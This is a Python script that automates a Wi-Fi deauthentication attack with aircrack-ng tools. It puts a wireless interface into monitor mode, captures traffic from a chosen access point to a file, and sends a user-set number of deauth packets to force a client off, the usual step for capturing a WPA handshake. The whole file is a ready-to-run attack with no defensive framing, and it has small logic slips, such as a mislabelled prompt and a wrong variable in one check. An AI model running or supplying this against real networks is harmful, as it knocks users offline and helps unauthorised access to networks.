#!/usr/bin/env python3

import subprocess
import sys
subprocess.call(["ifconfig"])
con = input("Enter to continue : ")
subprocess.call(["airmon-ng", "start", "wlan0"])
subprocess.call(["gnome-terminal", "-x", "airodump-ng","wlan0mon"])
x= input("Enter y to continue and n to quit : ")

if x=='y':
	mac_addr= input("Enter the BSSID : ")
	client_addr = input("Enter the BSSID : ")
	chann= input("Enter the channel of BSSID : ")
	print("performing airodump-ng")
	subprocess.call(["gnome-terminal", "-x", "airodump-ng", "-c", chann, "--bssid", mac_addr, "-w", "/root/Desktop/physon_wifi/capture/wifi", "wlan0mon"])
	y = input("enter y to continue to deauth else n to quit : ")
	if x=='y':
		deauth = input("enter the no of deauth packets to send : ")
		subprocess.call(["gnome-terminal", "-x", "aireplay-ng", "--deauth", deauth, "-a", mac_addr, "-c", client_addr, "wlan0mon"])
		print ("\033[38;5;2mThankYou\033[0m") 
	elif x=='n': 
		print("**********Getting out of Program**********")
        
elif x=='n':
	print ("\033[38;5;2mProgram-Exits\033[0m") 
	
